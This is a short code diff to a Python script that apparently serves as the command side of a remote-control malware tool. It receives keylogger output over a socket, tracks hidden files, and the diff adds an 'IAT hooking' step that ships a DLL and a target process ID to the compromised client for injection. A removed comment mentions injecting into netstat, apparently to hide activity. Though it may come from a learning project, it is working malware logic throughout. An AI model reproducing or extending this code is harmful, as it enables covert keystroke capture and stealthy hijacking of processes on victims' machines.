@@ -4,6 +4,8 @@ from threading import Thread
 
 from SocketManager import SocketManager
 
+IAT_HOOKING_PROCESS_ID = 4604
+IAT_HOOKING_DLL = r"IAT Hooking\IATHookingDLL.dll"
 KEY_LOGGER_FILE = r"C:\Users\admin\Desktop\keyLogger.txt"
 HIDDEN_FILE_PATH = r"C:\Users\admin\Desktop\hidden files.txt"
 DIR_TO_MOVE = r"C:\Users\admin\Desktop\New folder"
@@ -26,6 +28,11 @@ def bin_file_to_buffer(file_path):
                 break
             yield data1
 
+def full_bin_file_to_buffer(file_path):
+    with open(file_path, 'rb') as fp:
+        data = fp.read()
+
+    return data
 
 def key_logger_thread(conn, log_file_path):
     while 1:
@@ -46,8 +53,8 @@ def key_logger_thread(conn, log_file_path):
 
 
 if __name__ == '__main__':
-    TCP_IP = '127.0.0.1'
-    TCP_PORT = 5006
+    TCP_IP = '10.0.0.1'
+    TCP_PORT = 5007
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((TCP_IP, TCP_PORT))
@@ -142,8 +149,10 @@ if __name__ == '__main__':
         #     key_logger_thread_handle.
 
 
-        # Inject new fprintf to netstat
-
-
+        # IAT Hooking
+        SocketManager.send_data(conn, "IAT_HOOKING")
+        SocketManager.send_data(conn, str(IAT_HOOKING_PROCESS_ID))
+        dll_data = full_bin_file_to_buffer(IAT_HOOKING_DLL)
+        SocketManager.send_data(conn, dll_data)
 
 conn.close()
